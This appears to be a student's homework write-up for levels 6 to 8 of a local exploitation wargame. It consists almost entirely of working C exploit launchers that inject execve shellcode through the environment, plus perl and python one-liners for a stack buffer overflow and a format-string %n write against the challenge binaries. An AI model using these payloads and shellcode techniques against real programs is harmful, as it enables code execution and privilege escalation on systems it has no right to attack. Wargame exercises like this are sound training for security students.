# homeWork
LEVEL 6
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define VULN "/var/challenge/level6/6" // vulnerable program
char shellcode[] = "\xeb\x15\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43\x18\x8d\x4b\x14\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/usr/local/bin/l33t";       // shellcode string
int main() {
        unsigned int addr;
     // Define the commandline parameters that VULN expects
     char* cmdParam1 = "65535" ;char* cmdParam2= "\xb0 28";char* cmdParam3= "\xff 29";char* cmdParam4= "\xff 30";char* cmdParam5= "\xbf 31";
     addr = 0xc000000 -8 - strlen(VULN) - 1 - 47 -1;
     fprintf(stderr, "Using address: %#010x\n", addr);
     // Define a null-terminated argv array for execve()
     char *progWithParameters[] = 
         {VULN, cmdParam1, cmdParam2,cmdParam3,cmdParam4,cmdParam5, NULL};

     // Define a null-terminated envp array for execve()
     // This is where we place our shellcode, on the environment
     char *envp[] = {shellcode, NULL};

     // invoke execve(prog, progWithParameters, envp)
     execve(progWithParameters[0], progWithParameters, envp);

     return 0;
}
```
Level 7 
$(perl -e 'print "A"x64') $(perl -e 'print "B"x64') $(perl -e 'print "\xb0\xff\xff\xbf"x10')
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define VULN "/var/challenge/level7/7" // vulnerable program
char shellcode[] = "\xeb\x15\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43\x18\x8d\x4b\x14\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/usr/local/bin/l33t";       // shellcode string

int main(int argc, char **argv) {
        unsigned int addr;
        addr = 0xc000000 -8 - strlen(VULN) - 1 - 47 -1;
     // Define the commandline parameters that VULN expects
     char* cmdParam1 = argv[1];char* cmdParam2= argv[2];char* cmdParam3 = argv[3];
     fprintf(stderr, "Using address: %#010x\n", addr);
     // Define a null-terminated argv array for execve()
     char *progWithParameters[] = 
         {VULN, cmdParam1, cmdParam2,cmdParam3, NULL};

     // Define a null-terminated envp array for execve()
     // This is where we place our shellcode, on the environment
     char *envp[] = {shellcode, NULL};

     // invoke execve(prog, progWithParameters, envp)
     execve(progWithParameters[0], progWithParameters, envp);

     return 0;
}
```
Level 8
./ShellCode8 `python -c 'print "AA" + "\x10\xa0\x04\x08" + "\x11\xa0\x04\x08" + "\x12\xa0\x04\x08" + "\x13\xa0\x04\x08" + "%152u%68$n" + "%79u%69$n" + "%256u%70$n" + "%192u%71$n"'`
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define VULN "/var/challenge/level8/8" // vulnerable program
char shellcode[] = "\xeb\x15\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43\x18\x8d\x4b\x14\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/usr/local/bin/l33t";       // shellcode string

int main(int argc, char **argv) {
        unsigned int addr;
        addr = 0xc000000 -8 - strlen(VULN) - 1 - 47 -1;
     // Define the commandline parameters that VULN expects
     char* cmdParam1 = argv[1];
     fprintf(stderr, "Using address: %#010x\n", addr);
     // Define a null-terminated argv array for execve()
     char *progWithParameters[] =
         {VULN, cmdParam1, NULL};

     // Define a null-terminated envp array for execve()
     // This is where we place our shellcode, on the environment
     char *envp[] = {shellcode, NULL};

     // invoke execve(prog, progWithParameters, envp)
     execve(progWithParameters[0], progWithParameters, envp);

     return 0;
}

```
